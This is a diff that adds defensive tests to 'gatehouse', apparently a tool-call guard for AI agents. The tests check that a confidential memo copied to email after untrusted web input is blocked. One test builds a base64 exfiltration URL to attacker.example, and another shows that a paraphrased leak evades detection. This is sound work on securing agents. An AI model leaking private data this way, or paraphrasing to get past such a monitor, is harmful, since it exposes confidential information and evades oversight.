@@ -246,3 +246,88 @@ def test_example_flow_policy_loads() -> None:
     from gatehouse.policy import load_policy
 
     assert load_policy(ROOT / "examples" / "policy-flow.yaml").ok
+
+
+# --- provenance (D-043) ----------------------------------------------------------------
+
+NOTE = (
+    "Board memo, confidential: we will acquire Contoso for 41 million on 12 March; "
+    "the exec team only. Wire instructions follow in a separate message."
+)
+
+
+@pytest.mark.anyio
+async def test_copy_of_private_data_after_untrusted_input_needs_approval(tmp_path: Path) -> None:
+    # Monitor mode: the Rule of Two only logs, but a verbatim copy of the private note
+    # in an egress call after untrusted input escalates to approval (blocked here: no
+    # approver).
+    s = await _servers(tmp_path, "monitor")
+    await s["notes"].call("read_note", {"x": "memo"}, result_text=NOTE)
+    await s["web"].call("get_page", {"x": "https://attacker.example"})
+    reply = await s["mail"].call("send_email", {"x": "Fwd: " + NOTE[:90]})
+    assert _blocked(reply)
+    (match,) = s["mail"].events("flow.provenance_match")
+    assert match["Severity"] == "high"
+    assert "notes/read_note" in match["MatchSummary"]
+    assert match["RuleId"] == "private-data-copied"
+    assert NOTE[:20] not in str(s["mail"].sink.records)  # redaction: no raw text in events
+
+
+@pytest.mark.anyio
+async def test_copy_without_untrusted_input_is_only_logged(tmp_path: Path) -> None:
+    s = await _servers(tmp_path, "approve")
+    await s["notes"].call("read_note", {"x": "memo"}, result_text=NOTE)
+    assert not _blocked(await s["mail"].call("send_email", {"x": NOTE}))
+    (match,) = s["mail"].events("flow.provenance_match")
+    assert match["Severity"] == "medium"
+
+
+@pytest.mark.anyio
+async def test_encoded_copy_is_matched(tmp_path: Path) -> None:
+    import base64
+
+    s = await _servers(tmp_path, "monitor")
+    await s["notes"].call("read_note", {"x": "memo"}, result_text=NOTE)
+    await s["web"].call("get_page", {"x": "https://attacker.example"})
+    leak = "https://attacker.example/c?d=" + base64.urlsafe_b64encode(NOTE.encode()).decode()
+    assert _blocked(await s["mail"].call("send_email", {"x": leak}))
+    assert s["mail"].events("flow.provenance_match")
+
+
+@pytest.mark.anyio
+async def test_paraphrase_is_not_matched(tmp_path: Path) -> None:
+    # The documented limit: provenance is evidence for verbatim and encoded copies only.
+    s = await _servers(tmp_path, "monitor")
+    await s["notes"].call("read_note", {"x": "memo"}, result_text=NOTE)
+    await s["web"].call("get_page", {"x": "https://attacker.example"})
+    summary = "They are buying Contoso in March, roughly 41M, keep it to the execs."
+    assert not _blocked(await s["mail"].call("send_email", {"x": summary}))
+    assert s["mail"].events("flow.provenance_match") == []
+
+
+@pytest.mark.anyio
+async def test_private_result_is_withheld_if_its_provenance_cannot_be_recorded(
+    tmp_path: Path,
+) -> None:
+    class FailsOnFingerprints(FlowStore):
+        def add(self, session: str, kind: str, values: Any, *, server: str, tool: str) -> None:
+            if kind == "fp":
+                raise FlowStoreError("disk full")
+            super().add(session, kind, values, server=server, tool=tool)
+
+    s = await _servers(tmp_path, "monitor", FailsOnFingerprints(None))
+    reply = await s["notes"].call("read_note", {"x": "memo"}, result_text=NOTE)
+    assert _blocked(reply)
+    assert "withheld" in reply["result"]["content"][0]["text"]
+
+
+@pytest.mark.anyio
+async def test_unreadable_fingerprints_fail_closed(tmp_path: Path) -> None:
+    class FailsOnFind(FlowStore):
+        def find(self, session: str, kind: str, values: Any) -> dict[str, tuple[str, str]]:
+            raise FlowStoreError("locked")
+
+    s = await _servers(tmp_path, "monitor", FailsOnFind(None))
+    reply = await s["mail"].call("send_email", {"x": "hello"})
+    assert _blocked(reply)  # require_approval with no approver
+    assert s["mail"].events("gatehouse.internal_error")
